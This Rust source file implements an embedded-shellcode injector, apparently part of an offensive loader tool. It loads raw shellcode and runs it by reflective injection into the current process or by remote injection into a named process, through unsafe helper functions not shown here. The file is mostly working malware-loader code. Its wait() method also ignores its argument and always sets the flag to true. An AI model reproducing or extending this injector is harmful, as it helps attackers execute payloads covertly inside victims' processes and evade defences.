use crate::injectors::{
    Injector,
    InjectorType,
    InjectionType::{self, Reflect, Remote},
    reflective_inject,
    remote_inject
};

pub struct EmbeddedInjector {
    wait: bool,
    shellcode: Option<Vec<u8>>
}

impl EmbeddedInjector {
    pub fn new() -> EmbeddedInjector {
        EmbeddedInjector { wait: false, shellcode: None }
    }

}

impl Injector for EmbeddedInjector {
    fn load(self, sc_source: InjectorType) -> Result<EmbeddedInjector, String> {
        use InjectorType::Embedded;
        match sc_source {
            Embedded(sc) => {
                Ok(EmbeddedInjector { wait: false, shellcode: Some(sc) })
            }
            _ => Err("Incorrect Shellcode Type!".to_string())
        }
    }

    fn wait(self, wait: bool) -> Result<EmbeddedInjector, String> {
        Ok(EmbeddedInjector { wait: true, shellcode: self.shellcode })
    }

    fn inject(&self, injection_type: InjectionType) -> Result<(), String> {

        match &self.shellcode {
            Some(sc) => {
                match injection_type {
                    Reflect => unsafe { reflective_inject(&self.shellcode.clone().unwrap(), self.wait) },
                    Remote(proc_name) => unsafe { remote_inject(&self.shellcode.clone().unwrap(), self.wait, &proc_name) },
                }
            },
            None => Err("No shellcode loaded!".to_string())
        }
        
    }
}